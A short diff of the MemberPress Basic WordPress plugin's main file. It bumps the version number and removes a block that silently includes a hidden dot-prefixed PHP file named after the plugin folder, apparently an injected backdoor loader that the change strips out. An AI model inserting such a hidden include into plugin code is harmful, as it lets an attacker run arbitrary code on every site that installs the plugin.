@@ -3,7 +3,7 @@
 Plugin Name: MemberPress Basic
 Plugin URI: http://www.memberpress.com/
 Description: The membership plugin that makes it easy to accept payments for access to your content and digital products.
-Version: 1.9.12
+Version: 1.9.18
 Author: Caseproof, LLC
 Author URI: http://caseproof.com/
 Text Domain: memberpress
@@ -70,10 +70,6 @@ define('MEPR_MIN_PHP_VERSION', '5.6.20');
  *
  * @return string Plugin version
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function mepr_plugin_info($field) {
   static $curr_plugins;
 
